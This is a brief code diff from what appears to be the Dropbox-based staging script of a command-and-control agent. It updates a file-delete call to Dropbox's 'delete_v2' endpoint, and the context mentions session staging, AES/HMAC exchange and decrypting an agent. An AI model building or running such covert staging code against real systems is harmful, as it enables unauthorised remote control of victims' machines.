@@ -114,7 +114,7 @@ time.sleep(pollInterval)
 del headers['Dropbox-API-Arg']
 headers['Content-Type'] = "application/json"
 datastring = "{\"path\":\"%s/%s_4.txt\"}" % (stagingFolder, sessionID)
-response = post_message("https://api.dropboxapi.com/2/files/delete", data=datastring)
+response = post_message("https://api.dropboxapi.com/2/files/delete_v2", data=datastring)
 
 # step 6 -> server sends HMAC(AES)
 agent = aes_decrypt_and_verify(key, raw)
